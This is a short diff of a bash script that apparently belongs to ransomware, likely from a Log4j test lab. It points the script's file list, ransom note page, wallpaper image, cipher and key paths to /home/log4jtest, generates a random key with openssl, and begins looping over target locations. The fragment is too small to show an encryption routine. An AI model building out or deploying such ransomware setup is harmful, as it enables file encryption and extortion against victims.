@@ -1,11 +1,11 @@
 #!/bin/bash
 
-LIST=list
-RANSOM=ransom.html
-IMAGE=bg.jpg
-WKEY=whiteKey
-CIPHER=./whiteCipher
-KEY=key
+LIST=/home/log4jtest/list
+RANSOM=/home/log4jtest/ransom.html
+IMAGE=/home/log4jtest/bg.jpg
+WKEY=/home/log4jtest/whiteKey
+CIPHER=/home/log4jtest//whiteCipher
+KEY=/home/log4jtest/key
 openssl rand -hex 16 > $KEY
 
 for LOCATION in $(cat $LIST)
